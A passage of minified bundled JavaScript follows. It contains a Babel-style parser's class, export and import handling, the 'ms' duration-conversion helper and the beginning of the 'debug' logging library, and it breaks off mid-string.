this.parseFunction(X,8)}parseFunction(X,J=0){let Q=J&2,Y=!!(J&1),W=Y&&!(J&4),z=!!(J&8);if(this.initFunction(X,z),this.match(55)){if(Q)this.raise(b.GeneratorInSingleStatementContext,this.state.startLoc);this.next(),X.generator=!0}if(Y)X.id=this.parseFunctionId(W);let G=this.state.maybeInArrowParameters;if(this.state.maybeInArrowParameters=!1,this.scope.enter(514),this.prodParam.enter(W4(z,X.generator)),!Y)X.id=this.parseFunctionId();if(this.parseFunctionParams(X,!1),this.withSmartMixTopicForbiddingContext(()=>{this.parseFunctionBodyAndFinish(X,Y?"FunctionDeclaration":"FunctionExpression")}),this.prodParam.exit(),this.scope.exit(),Y&&!Q)this.registerFunctionStatementId(X);return this.state.maybeInArrowParameters=G,X}parseFunctionId(X){return X||C0(this.state.type)?this.parseIdentifier():null}parseFunctionParams(X,J){this.expect(10),this.expressionScope.enter(D_()),X.params=this.parseBindingList(11,41,2|(J?4:0)),this.expressionScope.exit()}registerFunctionStatementId(X){if(!X.id)return;this.scope.declareName(X.id.name,!this.options.annexB||this.state.strict||X.generator||X.async?this.scope.treatFunctionsAsVar?5:8201:17,X.id.loc.start)}parseClass(X,J,Q){this.next();let Y=this.state.strict;return this.state.strict=!0,this.parseClassId(X,J,Q),this.parseClassSuper(X),X.body=this.parseClassBody(!!X.superClass,Y),this.finishNode(X,J?"ClassDeclaration":"ClassExpression")}isClassProperty(){return this.match(29)||this.match(13)||this.match(8)}isClassMethod(){return this.match(10)}nameIsConstructor(X){return X.type==="Identifier"&&X.name==="constructor"||X.type==="StringLiteral"&&X.value==="constructor"}isNonstaticConstructor(X){return!X.computed&&!X.static&&this.nameIsConstructor(X.key)}parseClassBody(X,J){this.classScope.enter();let Q={hadConstructor:!1,hadSuperClass:X},Y=[],W=this.startNode();if(W.body=[],this.expect(5),this.withSmartMixTopicForbiddingContext(()=>{while(!this.match(8)){if(this.eat(13)){if(Y.length>0)throw this.raise(b.DecoratorSemicolon,this.state.lastTokEndLoc);continue}if(this.match(26)){Y.push(this.parseDecorator());continue}let z=this.startNode();if(Y.length)z.decorators=Y,this.resetStartLocationFromNode(z,Y[0]),Y=[];if(this.parseClassMember(W,z,Q),z.kind==="constructor"&&z.decorators&&z.decorators.length>0)this.raise(b.DecoratorConstructor,z)}}),this.state.strict=J,this.next(),Y.length)throw this.raise(b.TrailingDecorator,this.state.startLoc);return this.classScope.exit(),this.finishNode(W,"ClassBody")}parseClassMemberFromModifier(X,J){let Q=this.parseIdentifier(!0);if(this.isClassMethod()){let Y=J;return Y.kind="method",Y.computed=!1,Y.key=Q,Y.static=!1,this.pushClassMethod(X,Y,!1,!1,!1,!1),!0}else if(this.isClassProperty()){let Y=J;return Y.computed=!1,Y.key=Q,Y.static=!1,X.body.push(this.parseClassProperty(Y)),!0}return this.resetPreviousNodeTrailingComments(Q),!1}parseClassMember(X,J,Q){let Y=this.isContextual(106);if(Y){if(this.parseClassMemberFromModifier(X,J))return;if(this.eat(5)){this.parseClassStaticBlock(X,J);return}}this.parseClassMemberWithIsStatic(X,J,Q,Y)}parseClassMemberWithIsStatic(X,J,Q,Y){let W=J,z=J,G=J,H=J,U=J,K=W,V=W;if(J.static=Y,this.parsePropertyNamePrefixOperator(J),this.eat(55)){K.kind="method";let O=this.match(139);if(this.parseClassElementName(K),this.parsePostMemberNameModifiers(K),O){this.pushClassPrivateMethod(X,z,!0,!1);return}if(this.isNonstaticConstructor(W))this.raise(b.ConstructorIsGenerator,W.key);this.pushClassMethod(X,W,!0,!1,!1,!1);return}let B=!this.state.containsEsc&&C0(this.state.type),Z=this.parseClassElementName(J),M=B?Z.name:null,F=this.isPrivateName(Z),j=this.state.startLoc;if(this.parsePostMemberNameModifiers(V),this.isClassMethod()){if(K.kind="method",F){this.pushClassPrivateMethod(X,z,!1,!1);return}let O=this.isNonstaticConstructor(W),N=!1;if(O){if(W.kind="constructor",Q.hadConstructor&&!this.hasPlugin("typescript"))this.raise(b.DuplicateConstructor,Z);if(O&&this.hasPlugin("typescript")&&J.override)this.raise(b.OverrideOnConstructor,Z);Q.hadConstructor=!0,N=Q.hadSuperClass}this.pushClassMethod(X,W,!1,!1,O,N)}else if(this.isClassProperty())if(F)this.pushClassPrivateProperty(X,H);else this.pushClassProperty(X,G);else if(M==="async"&&!this.isLineTerminator()){this.resetPreviousNodeTrailingComments(Z);let O=this.eat(55);if(V.optional)this.unexpected(j);K.kind="method";let N=this.match(139);if(this.parseClassElementName(K),this.parsePostMemberNameModifiers(V),N)this.pushClassPrivateMethod(X,z,O,!0);else{if(this.isNonstaticConstructor(W))this.raise(b.ConstructorIsAsync,W.key);this.pushClassMethod(X,W,O,!0,!1,!1)}}else if((M==="get"||M==="set")&&!(this.match(55)&&this.isLineTerminator())){this.resetPreviousNodeTrailingComments(Z),K.kind=M;let O=this.match(139);if(this.parseClassElementName(W),O)this.pushClassPrivateMethod(X,z,!1,!1);else{if(this.isNonstaticConstructor(W))this.raise(b.ConstructorIsAccessor,W.key);this.pushClassMethod(X,W,!1,!1,!1,!1)}this.checkGetterSetterParams(W)}else if(M==="accessor"&&!this.isLineTerminator()){this.expectPlugin("decoratorAutoAccessors"),this.resetPreviousNodeTrailingComments(Z);let O=this.match(139);this.parseClassElementName(G),this.pushClassAccessorProperty(X,U,O)}else if(this.isLineTerminator())if(F)this.pushClassPrivateProperty(X,H);else this.pushClassProperty(X,G);else this.unexpected()}parseClassElementName(X){let{type:J,value:Q}=this.state;if((J===132||J===134)&&X.static&&Q==="prototype")this.raise(b.StaticPrototype,this.state.startLoc);if(J===139){if(Q==="constructor")this.raise(b.ConstructorClassPrivateField,this.state.startLoc);let Y=this.parsePrivateName();return X.key=Y,Y}return this.parsePropertyName(X),X.key}parseClassStaticBlock(X,J){var Q;this.scope.enter(720);let Y=this.state.labels;this.state.labels=[],this.prodParam.enter(0);let W=J.body=[];if(this.parseBlockOrModuleBlockBody(W,void 0,!1,8),this.prodParam.exit(),this.scope.exit(),this.state.labels=Y,X.body.push(this.finishNode(J,"StaticBlock")),(Q=J.decorators)!=null&&Q.length)this.raise(b.DecoratorStaticBlock,J)}pushClassProperty(X,J){if(!J.computed&&this.nameIsConstructor(J.key))this.raise(b.ConstructorClassField,J.key);X.body.push(this.parseClassProperty(J))}pushClassPrivateProperty(X,J){let Q=this.parseClassPrivateProperty(J);X.body.push(Q),this.classScope.declarePrivateName(this.getPrivateNameSV(Q.key),0,Q.key.loc.start)}pushClassAccessorProperty(X,J,Q){if(!Q&&!J.computed&&this.nameIsConstructor(J.key))this.raise(b.ConstructorClassField,J.key);let Y=this.parseClassAccessorProperty(J);if(X.body.push(Y),Q)this.classScope.declarePrivateName(this.getPrivateNameSV(Y.key),0,Y.key.loc.start)}pushClassMethod(X,J,Q,Y,W,z){X.body.push(this.parseMethod(J,Q,Y,W,z,"ClassMethod",!0))}pushClassPrivateMethod(X,J,Q,Y){let W=this.parseMethod(J,Q,Y,!1,!1,"ClassPrivateMethod",!0);X.body.push(W);let z=W.kind==="get"?W.static?6:2:W.kind==="set"?W.static?5:1:0;this.declareClassPrivateMethodInScope(W,z)}declareClassPrivateMethodInScope(X,J){this.classScope.declarePrivateName(this.getPrivateNameSV(X.key),J,X.key.loc.start)}parsePostMemberNameModifiers(X){}parseClassPrivateProperty(X){return this.parseInitializer(X),this.semicolon(),this.finishNode(X,"ClassPrivateProperty")}parseClassProperty(X){return this.parseInitializer(X),this.semicolon(),this.finishNode(X,"ClassProperty")}parseClassAccessorProperty(X){return this.parseInitializer(X),this.semicolon(),this.finishNode(X,"ClassAccessorProperty")}parseInitializer(X){this.scope.enter(592),this.expressionScope.enter(VV()),this.prodParam.enter(0),X.value=this.eat(29)?this.parseMaybeAssignAllowIn():null,this.expressionScope.exit(),this.prodParam.exit(),this.scope.exit()}parseClassId(X,J,Q,Y=8331){if(C0(this.state.type)){if(X.id=this.parseIdentifier(),J)this.declareNameFromIdentifier(X.id,Y)}else if(Q||!J)X.id=null;else throw this.raise(b.MissingClassName,this.state.startLoc)}parseClassSuper(X){X.superClass=this.eat(81)?this.parseExprSubscripts():null}parseExport(X,J){let Q=this.parseMaybeImportPhase(X,!0),Y=this.maybeParseExportDefaultSpecifier(X,Q),W=!Y||this.eat(12),z=W&&this.eatExportStar(X),G=z&&this.maybeParseExportNamespaceSpecifier(X),H=W&&(!G||this.eat(12)),U=Y||z;if(z&&!G){if(Y)this.unexpected();if(J)throw this.raise(b.UnsupportedDecoratorExport,X);return this.parseExportFrom(X,!0),this.sawUnambiguousESM=!0,this.finishNode(X,"ExportAllDeclaration")}let K=this.maybeParseExportNamedSpecifiers(X);if(Y&&W&&!z&&!K)this.unexpected(null,5);if(G&&H)this.unexpected(null,98);let V;if(U||K){if(V=!1,J)throw this.raise(b.UnsupportedDecoratorExport,X);this.parseExportFrom(X,U)}else V=this.maybeParseExportDeclaration(X);if(U||K||V){var B;let Z=X;if(this.checkExport(Z,!0,!1,!!Z.source),((B=Z.declaration)==null?void 0:B.type)==="ClassDeclaration")this.maybeTakeDecorators(J,Z.declaration,Z);else if(J)throw this.raise(b.UnsupportedDecoratorExport,X);return this.sawUnambiguousESM=!0,this.finishNode(Z,"ExportNamedDeclaration")}if(this.eat(65)){let Z=X,M=this.parseExportDefaultExpression();if(Z.declaration=M,M.type==="ClassDeclaration")this.maybeTakeDecorators(J,M,Z);else if(J)throw this.raise(b.UnsupportedDecoratorExport,X);return this.checkExport(Z,!0,!0),this.sawUnambiguousESM=!0,this.finishNode(Z,"ExportDefaultDeclaration")}this.unexpected(null,5)}eatExportStar(X){return this.eat(55)}maybeParseExportDefaultSpecifier(X,J){if(J||this.isExportDefaultSpecifier()){this.expectPlugin("exportDefaultFrom",J==null?void 0:J.loc.start);let Q=J||this.parseIdentifier(!0),Y=this.startNodeAtNode(Q);return Y.exported=Q,X.specifiers=[this.finishNode(Y,"ExportDefaultSpecifier")],!0}return!1}maybeParseExportNamespaceSpecifier(X){if(this.isContextual(93)){var J,Q;(Q=(J=X).specifiers)!=null||(J.specifiers=[]);let Y=this.startNodeAt(this.state.lastTokStartLoc);return this.next(),Y.exported=this.parseModuleExportName(),X.specifiers.push(this.finishNode(Y,"ExportNamespaceSpecifier")),!0}return!1}maybeParseExportNamedSpecifiers(X){if(this.match(5)){let J=X;if(!J.specifiers)J.specifiers=[];let Q=J.exportKind==="type";if(J.specifiers.push(...this.parseExportSpecifiers(Q)),J.source=null,this.hasPlugin("importAssertions"))J.assertions=[];else J.attributes=[];return J.declaration=null,!0}return!1}maybeParseExportDeclaration(X){if(this.shouldParseExportDeclaration()){if(X.specifiers=[],X.source=null,this.hasPlugin("importAssertions"))X.assertions=[];else X.attributes=[];return X.declaration=this.parseExportDeclaration(X),!0}return!1}isAsyncFunction(){if(!this.isContextual(95))return!1;let X=this.nextTokenInLineStart();return this.isUnparsedContextual(X,"function")}parseExportDefaultExpression(){let X=this.startNode();if(this.match(68))return this.next(),this.parseFunction(X,5);else if(this.isAsyncFunction())return this.next(),this.next(),this.parseFunction(X,13);if(this.match(80))return this.parseClass(X,!0,!0);if(this.match(26)){if(this.hasPlugin("decorators")&&this.getPluginOption("decorators","decoratorsBeforeExport")===!0)this.raise(b.DecoratorBeforeExport,this.state.startLoc);return this.parseClass(this.maybeTakeDecorators(this.parseDecorators(!1),this.startNode()),!0,!0)}if(this.match(75)||this.match(74)||this.isLet()||this.isUsing()||this.isAwaitUsing())throw this.raise(b.UnsupportedDefaultExport,this.state.startLoc);let J=this.parseMaybeAssignAllowIn();return this.semicolon(),J}parseExportDeclaration(X){if(this.match(80))return this.parseClass(this.startNode(),!0,!1);return this.parseStatementListItem()}isExportDefaultSpecifier(){let{type:X}=this.state;if(C0(X)){if(X===95&&!this.state.containsEsc||X===100)return!1;if((X===130||X===129)&&!this.state.containsEsc){let Y=this.nextTokenStart(),W=this.input.charCodeAt(Y);if(W===123||this.chStartsBindingIdentifier(W,Y)&&!this.input.startsWith("from",Y))return this.expectOnePlugin(["flow","typescript"]),!1}}else if(!this.match(65))return!1;let J=this.nextTokenStart(),Q=this.isUnparsedContextual(J,"from");if(this.input.charCodeAt(J)===44||C0(this.state.type)&&Q)return!0;if(this.match(65)&&Q){let Y=this.input.charCodeAt(this.nextTokenStartSince(J+4));return Y===34||Y===39}return!1}parseExportFrom(X,J){if(this.eatContextual(98))X.source=this.parseImportSource(),this.checkExport(X),this.maybeParseImportAttributes(X),this.checkJSONModuleImport(X);else if(J)this.unexpected();this.semicolon()}shouldParseExportDeclaration(){let{type:X}=this.state;if(X===26){if(this.expectOnePlugin(["decorators","decorators-legacy"]),this.hasPlugin("decorators")){if(this.getPluginOption("decorators","decoratorsBeforeExport")===!0)this.raise(b.DecoratorBeforeExport,this.state.startLoc);return!0}}if(this.isUsing())return this.raise(b.UsingDeclarationExport,this.state.startLoc),!0;if(this.isAwaitUsing())return this.raise(b.UsingDeclarationExport,this.state.startLoc),!0;return X===74||X===75||X===68||X===80||this.isLet()||this.isAsyncFunction()}checkExport(X,J,Q,Y){if(J){var W;if(Q){if(this.checkDuplicateExports(X,"default"),this.hasPlugin("exportDefaultFrom")){var z;let G=X.declaration;if(G.type==="Identifier"&&G.name==="from"&&G.end-G.start===4&&!((z=G.extra)!=null&&z.parenthesized))this.raise(b.ExportDefaultFromAsIdentifier,G)}}else if((W=X.specifiers)!=null&&W.length)for(let G of X.specifiers){let{exported:H}=G,U=H.type==="Identifier"?H.name:H.value;if(this.checkDuplicateExports(G,U),!Y&&G.local){let{local:K}=G;if(K.type!=="Identifier")this.raise(b.ExportBindingIsString,G,{localName:K.value,exportName:U});else this.checkReservedWord(K.name,K.loc.start,!0,!1),this.scope.checkLocalExport(K)}}else if(X.declaration){let G=X.declaration;if(G.type==="FunctionDeclaration"||G.type==="ClassDeclaration"){let{id:H}=G;if(!H)throw new Error("Assertion failure");this.checkDuplicateExports(X,H.name)}else if(G.type==="VariableDeclaration")for(let H of G.declarations)this.checkDeclaration(H.id)}}}checkDeclaration(X){if(X.type==="Identifier")this.checkDuplicateExports(X,X.name);else if(X.type==="ObjectPattern")for(let J of X.properties)this.checkDeclaration(J);else if(X.type==="ArrayPattern"){for(let J of X.elements)if(J)this.checkDeclaration(J)}else if(X.type==="ObjectProperty")this.checkDeclaration(X.value);else if(X.type==="RestElement")this.checkDeclaration(X.argument);else if(X.type==="AssignmentPattern")this.checkDeclaration(X.left)}checkDuplicateExports(X,J){if(this.exportedIdentifiers.has(J))if(J==="default")this.raise(b.DuplicateDefaultExport,X);else this.raise(b.DuplicateExport,X,{exportName:J});this.exportedIdentifiers.add(J)}parseExportSpecifiers(X){let J=[],Q=!0;this.expect(5);while(!this.eat(8)){if(Q)Q=!1;else if(this.expect(12),this.eat(8))break;let Y=this.isContextual(130),W=this.match(134),z=this.startNode();z.local=this.parseModuleExportName(),J.push(this.parseExportSpecifier(z,W,X,Y))}return J}parseExportSpecifier(X,J,Q,Y){if(this.eatContextual(93))X.exported=this.parseModuleExportName();else if(J)X.exported=this.cloneStringLiteral(X.local);else if(!X.exported)X.exported=this.cloneIdentifier(X.local);return this.finishNode(X,"ExportSpecifier")}parseModuleExportName(){if(this.match(134)){let X=this.parseStringLiteral(this.state.value),J=g_.exec(X.value);if(J)this.raise(b.ModuleExportNameHasLoneSurrogate,X,{surrogateCharCode:J[0].charCodeAt(0)});return X}return this.parseIdentifier(!0)}isJSONModuleImport(X){if(X.assertions!=null)return X.assertions.some(({key:J,value:Q})=>{return Q.value==="json"&&(J.type==="Identifier"?J.name==="type":J.value==="type")});return!1}checkImportReflection(X){let{specifiers:J}=X,Q=J.length===1?J[0].type:null;if(X.phase==="source"){if(Q!=="ImportDefaultSpecifier")this.raise(b.SourcePhaseImportRequiresDefault,J[0].loc.start)}else if(X.phase==="defer"){if(Q!=="ImportNamespaceSpecifier")this.raise(b.DeferImportRequiresNamespace,J[0].loc.start)}else if(X.module){var Y;if(Q!=="ImportDefaultSpecifier")this.raise(b.ImportReflectionNotBinding,J[0].loc.start);if(((Y=X.assertions)==null?void 0:Y.length)>0)this.raise(b.ImportReflectionHasAssertion,J[0].loc.start)}}checkJSONModuleImport(X){if(this.isJSONModuleImport(X)&&X.type!=="ExportAllDeclaration"){let{specifiers:J}=X;if(J!=null){let Q=J.find((Y)=>{let W;if(Y.type==="ExportSpecifier")W=Y.local;else if(Y.type==="ImportSpecifier")W=Y.imported;if(W!==void 0)return W.type==="Identifier"?W.name!=="default":W.value!=="default"});if(Q!==void 0)this.raise(b.ImportJSONBindingNotDefault,Q.loc.start)}}}isPotentialImportPhase(X){if(X)return!1;return this.isContextual(105)||this.isContextual(97)||this.isContextual(127)}applyImportPhase(X,J,Q,Y){if(J)return;if(Q==="module")this.expectPlugin("importReflection",Y),X.module=!0;else if(this.hasPlugin("importReflection"))X.module=!1;if(Q==="source")this.expectPlugin("sourcePhaseImports",Y),X.phase="source";else if(Q==="defer")this.expectPlugin("deferredImportEvaluation",Y),X.phase="defer";else if(this.hasPlugin("sourcePhaseImports"))X.phase=null}parseMaybeImportPhase(X,J){if(!this.isPotentialImportPhase(J))return this.applyImportPhase(X,J,null),null;let Q=this.startNode(),Y=this.parseIdentifierName(!0),{type:W}=this.state;if(I8(W)?W!==98||this.lookaheadCharCode()===102:W!==12)return this.applyImportPhase(X,J,Y,Q.loc.start),null;else return this.applyImportPhase(X,J,null),this.createIdentifier(Q,Y)}isPrecedingIdImportPhase(X){let{type:J}=this.state;return C0(J)?J!==98||this.lookaheadCharCode()===102:J!==12}parseImport(X){if(this.match(134))return this.parseImportSourceAndAttributes(X);return this.parseImportSpecifiersAndAfter(X,this.parseMaybeImportPhase(X,!1))}parseImportSpecifiersAndAfter(X,J){X.specifiers=[];let Y=!this.maybeParseDefaultImportSpecifier(X,J)||this.eat(12),W=Y&&this.maybeParseStarImportSpecifier(X);if(Y&&!W)this.parseNamedImportSpecifiers(X);return this.expectContextual(98),this.parseImportSourceAndAttributes(X)}parseImportSourceAndAttributes(X){var J;return(J=X.specifiers)!=null||(X.specifiers=[]),X.source=this.parseImportSource(),this.maybeParseImportAttributes(X),this.checkImportReflection(X),this.checkJSONModuleImport(X),this.semicolon(),this.sawUnambiguousESM=!0,this.finishNode(X,"ImportDeclaration")}parseImportSource(){if(!this.match(134))this.unexpected();return this.parseExprAtom()}parseImportSpecifierLocal(X,J,Q){J.local=this.parseIdentifier(),X.specifiers.push(this.finishImportSpecifier(J,Q))}finishImportSpecifier(X,J,Q=8201){return this.checkLVal(X.local,{type:J},Q),this.finishNode(X,J)}parseImportAttributes(){this.expect(5);let X=[],J=new Set;do{if(this.match(8))break;let Q=this.startNode(),Y=this.state.value;if(J.has(Y))this.raise(b.ModuleAttributesWithDuplicateKeys,this.state.startLoc,{key:Y});if(J.add(Y),this.match(134))Q.key=this.parseStringLiteral(Y);else Q.key=this.parseIdentifier(!0);if(this.expect(14),!this.match(134))throw this.raise(b.ModuleAttributeInvalidValue,this.state.startLoc);Q.value=this.parseStringLiteral(this.state.value),X.push(this.finishNode(Q,"ImportAttribute"))}while(this.eat(12));return this.expect(8),X}parseModuleAttributes(){let X=[],J=new Set;do{let Q=this.startNode();if(Q.key=this.parseIdentifier(!0),Q.key.name!=="type")this.raise(b.ModuleAttributeDifferentFromType,Q.key);if(J.has(Q.key.name))this.raise(b.ModuleAttributesWithDuplicateKeys,Q.key,{key:Q.key.name});if(J.add(Q.key.name),this.expect(14),!this.match(134))throw this.raise(b.ModuleAttributeInvalidValue,this.state.startLoc);Q.value=this.parseStringLiteral(this.state.value),X.push(this.finishNode(Q,"ImportAttribute"))}while(this.eat(12));return X}maybeParseImportAttributes(X){let J;var Q=!1;if(this.match(76)){if(this.hasPrecedingLineBreak()&&this.lookaheadCharCode()===40)return;if(this.next(),this.hasPlugin("moduleAttributes"))J=this.parseModuleAttributes(),this.addExtra(X,"deprecatedWithLegacySyntax",!0);else J=this.parseImportAttributes();Q=!0}else if(this.isContextual(94)&&!this.hasPrecedingLineBreak()){if(!this.hasPlugin("deprecatedImportAssert")&&!this.hasPlugin("importAssertions"))this.raise(b.ImportAttributesUseAssert,this.state.startLoc);if(!this.hasPlugin("importAssertions"))this.addExtra(X,"deprecatedAssertSyntax",!0);this.next(),J=this.parseImportAttributes()}else J=[];if(!Q&&this.hasPlugin("importAssertions"))X.assertions=J;else X.attributes=J}maybeParseDefaultImportSpecifier(X,J){if(J){let Q=this.startNodeAtNode(J);return Q.local=J,X.specifiers.push(this.finishImportSpecifier(Q,"ImportDefaultSpecifier")),!0}else if(I8(this.state.type))return this.parseImportSpecifierLocal(X,this.startNode(),"ImportDefaultSpecifier"),!0;return!1}maybeParseStarImportSpecifier(X){if(this.match(55)){let J=this.startNode();return this.next(),this.expectContextual(93),this.parseImportSpecifierLocal(X,J,"ImportNamespaceSpecifier"),!0}return!1}parseNamedImportSpecifiers(X){let J=!0;this.expect(5);while(!this.eat(8)){if(J)J=!1;else{if(this.eat(14))throw this.raise(b.DestructureNamedImport,this.state.startLoc);if(this.expect(12),this.eat(8))break}let Q=this.startNode(),Y=this.match(134),W=this.isContextual(130);Q.imported=this.parseModuleExportName();let z=this.parseImportSpecifier(Q,Y,X.importKind==="type"||X.importKind==="typeof",W,void 0);X.specifiers.push(z)}}parseImportSpecifier(X,J,Q,Y,W){if(this.eatContextual(93))X.local=this.parseIdentifier();else{let{imported:z}=X;if(J)throw this.raise(b.ImportBindingIsString,X,{importName:z.value});if(this.checkReservedWord(z.name,X.loc.start,!0,!0),!X.local)X.local=this.cloneIdentifier(z)}return this.finishImportSpecifier(X,"ImportSpecifier",W)}isThisParam(X){return X.type==="Identifier"&&X.name==="this"}}class zW extends AV{constructor(X,J,Q){X=fT(X);super(X,J);this.options=X,this.initializeScopes(),this.plugins=Q,this.filename=X.sourceFilename,this.startIndex=X.startIndex;let Y=0;if(X.allowAwaitOutsideFunction)Y|=1;if(X.allowReturnOutsideFunction)Y|=2;if(X.allowImportExportEverywhere)Y|=8;if(X.allowSuperOutsideMethod)Y|=16;if(X.allowUndeclaredExports)Y|=64;if(X.allowNewTargetOutsideFunction)Y|=4;if(X.allowYieldOutsideFunction)Y|=32;if(X.ranges)Y|=128;if(X.tokens)Y|=256;if(X.createImportExpressions)Y|=512;if(X.createParenthesizedExpressions)Y|=1024;if(X.errorRecovery)Y|=2048;if(X.attachComment)Y|=4096;if(X.annexB)Y|=8192;this.optionFlags=Y}getScopeHandler(){return H4}parse(){this.enterInitialScopes();let X=this.startNode(),J=this.startNode();return this.nextToken(),X.errors=null,this.parseTopLevel(X,J),X.errors=this.state.errors,X.comments.length=this.state.commentsLen,X}}function y_(X,J){var Q;if(((Q=J)==null?void 0:Q.sourceType)==="unambiguous"){J=Object.assign({},J);try{J.sourceType="module";let Y=F5(J,X),W=Y.parse();if(Y.sawUnambiguousESM)return W;if(Y.ambiguousScriptDifferentAst)try{return J.sourceType="script",F5(J,X).parse()}catch(z){}else W.program.sourceType="script";return W}catch(Y){try{return J.sourceType="script",F5(J,X).parse()}catch(W){}throw Y}}else return F5(J,X).parse()}function m_(X,J){let Q=F5(J,X);if(Q.options.strictMode)Q.state.strict=!0;return Q.getExpression()}function u_(X){let J={};for(let Q of Object.keys(X))J[Q]=O6(X[Q]);return J}var c_=u_(mT);function F5(X,J){let Q=zW,Y=new Map;if(X!=null&&X.plugins){for(let W of X.plugins){let z,G;if(typeof W==="string")z=W;else[z,G]=W;if(!Y.has(z))Y.set(z,G||{})}v_(Y),Q=l_(Y)}return new Q(X,J,Y)}var cK=new Map;function l_(X){let J=[];for(let W of x_)if(X.has(W))J.push(W);let Q=J.join("|"),Y=cK.get(Q);if(!Y){Y=zW;for(let W of J)Y=OV[W](Y);cK.set(Q,Y)}return Y}NV.parse=y_;NV.parseExpression=m_;NV.tokTypes=c_});var HW=c((LV)=>{Object.defineProperty(LV,"__esModule",{value:!0});LV.Var=LV.User=LV.Statement=LV.SpreadProperty=LV.Scope=LV.RestProperty=LV.ReferencedMemberExpression=LV.ReferencedIdentifier=LV.Referenced=LV.Pure=LV.NumericLiteralTypeAnnotation=LV.Generated=LV.ForAwaitStatement=LV.Flow=LV.Expression=LV.ExistentialTypeParam=LV.BlockScoped=LV.BindingIdentifier=void 0;var Bp1=LV.ReferencedIdentifier=["Identifier","JSXIdentifier"],qp1=LV.ReferencedMemberExpression=["MemberExpression"],Zp1=LV.BindingIdentifier=["Identifier"],Mp1=LV.Statement=["Statement"],Fp1=LV.Expression=["Expression"],jp1=LV.Scope=["Scopable","Pattern"],Op1=LV.Referenced=null,Rp1=LV.BlockScoped=null,Ap1=LV.Var=["VariableDeclaration"],Np1=LV.User=null,Lp1=LV.Generated=null,Dp1=LV.Pure=null,wp1=LV.Flow=["Flow","ImportDeclaration","ExportDeclaration","ImportSpecifier"],Ip1=LV.RestProperty=["RestElement"],Cp1=LV.SpreadProperty=["RestElement"],Pp1=LV.ExistentialTypeParam=["ExistsTypeAnnotation"],Sp1=LV.NumericLiteralTypeAnnotation=["NumberLiteralTypeAnnotation"],Tp1=LV.ForAwaitStatement=["ForOfStatement"]});var IV=c((Ep1,wV)=>{var hJ=1000,yJ=hJ*60,mJ=yJ*60,SX=mJ*24,VE=SX*7,BE=SX*365.25;wV.exports=function(X,J){J=J||{};var Q=typeof X;if(Q==="string"&&X.length>0)return qE(X);else if(Q==="number"&&isFinite(X))return J.long?ME(X):ZE(X);throw new Error("val is not a non-empty string or a valid number. val="+JSON.stringify(X))};function qE(X){if(X=String(X),X.length>100)return;var J=/^(-?(?:\d+)?\.?\d+) *(milliseconds?|msecs?|ms|seconds?|secs?|s|minutes?|mins?|m|hours?|hrs?|h|days?|d|weeks?|w|years?|yrs?|y)?$/i.exec(X);if(!J)return;var Q=parseFloat(J[1]),Y=(J[2]||"ms").toLowerCase();switch(Y){case"years":case"year":case"yrs":case"yr":case"y":return Q*BE;case"weeks":case"week":case"w":return Q*VE;case"days":case"day":case"d":return Q*SX;case"hours":case"hour":case"hrs":case"hr":case"h":return Q*mJ;case"minutes":case"minute":case"mins":case"min":case"m":return Q*yJ;case"seconds":case"second":case"secs":case"sec":case"s":return Q*hJ;case"milliseconds":case"millisecond":case"msecs":case"msec":case"ms":return Q;default:return}}function ZE(X){var J=Math.abs(X);if(J>=SX)return Math.round(X/SX)+"d";if(J>=mJ)return Math.round(X/mJ)+"h";if(J>=yJ)return Math.round(X/yJ)+"m";if(J>=hJ)return Math.round(X/hJ)+"s";return X+"ms"}function ME(X){var J=Math.abs(X);if(J>=SX)return K4(X,J,SX,"day");if(J>=mJ)return K4(X,J,mJ,"hour");if(J>=yJ)return K4(X,J,yJ,"minute");if(J>=hJ)return K4(X,J,hJ,"second");return X+" ms"}function K4(X,J,Q,Y){var W=J>=Q*1.5;return Math.round(X/Q)+" "+Y+(W?"s":"")}});var UW=c(($p1,CV)=>{function FE(X){Q.debug=Q,Q.default=Q,Q.coerce=U,Q.disable=G,Q.enable=W,Q.enabled=H,Q.humanize=IV(),Q.destroy=K,Object.keys(X).forEach((V)=>{Q[V]=X[V]}),Q.names=[],Q.skips=[],Q.formatters={};function J(V){let B=0;for(let Z=0;Z<V.length;Z++)B=(B<<5)-B+V.charCodeAt(Z),B|=0;return Q.colors[Math.abs(B)%Q.colors.length]}Q.selectColor=J;function Q(V){let B,Z=null,M,F;function j(...O){if(!j.enabled)return;let N=j,A=Number(new Date),D=A-(B||A);if(N.diff=D,N.prev=B,N.curr=A,B=A,O[0]=Q.coerce(O[0]),typeof O[0]!=="string")O.unshift("%O");let S=0;O[0]=O[0].replace(/%([a-zA-Z%])/g,(T,k)=>{if(T==="%%")return"%";S++;let E=Q.formatters[k];if(typeof E==="function"){let y=O[S];T=E.call(N,y),O.splice(S,1),S--}return T}),Q.formatArgs.call(N,O),(N.log||Q.log).apply(N,O)}if(j.namespace=V,j.useColors=Q.useColors(),j.color=Q.selectColor(V),j.extend=Y,j.destroy=Q.destroy,Object.defineProperty(j,"enabled",{enumerable:!0,configurable:!1,get:()=>{if(Z!==null)return Z;if(M!==Q.namespaces)M=Q.namespaces,F=Q.enabled(V);return F},set:(O)=>{Z=O}}),typeof Q.init==="function")Q.init(j);return j}function Y(V,B){let Z=Q(this.namespace+(typeof B==="undefined"?":":B)+V);return Z.log=this.log,Z}function W(V){Q.save(V),Q.namespaces=V,Q.names=[],Q.skips=[];let B=(typeof V==="string"?V:"").trim().replace(/\s+/g,",").split(",").filter(Boolean);for(let Z of B)if(Z[0]==="-")Q.skips.push(Z.slice(1));else Q.names.push(Z)}function z(V,B){let Z=0,M=0,F=-1,j=0;while(Z<V.length)if(M<B.length&&(B[M]===V[Z]||B[M]==="*"))if(B[M]==="*")F=M,j=Z,M++;else Z++,M++;else if(F!==-1)M=F+1,j++,Z=j;else return!1;while(M<B.length&&B[M]==="*")M++;return M===B.length}function G(){let V=[...Q.names,...Q.skips.map((B)=>"-"+B)].join(",");return Q.enable(""),V}function H(V){for(let B of Q.skips)if(z(V,B))return!1;for(let B of Q.names)if(z(V,B))return!0;return!1}function U(V){if(V instanceof Error)return V.stack||V.message;return V}function K(){console.warn("Instance method `debug.destroy()` is deprecated and no longer does anything. It will be removed in the next major version of `debug`.")}return Q.enable(Q.load()),Q}CV.exports=FE});var SV=c((PV,V4)=>{PV.formatArgs=OE;PV.save=RE;PV.load=AE;PV.useColors=jE;PV.storage=NE();PV.destroy=(()=>{let X=!1;return()=>{if(!X)X=!0,console.warn("Instance method `debug.destroy()` is deprecated and no longer does anything. It will be removed in the next major version of 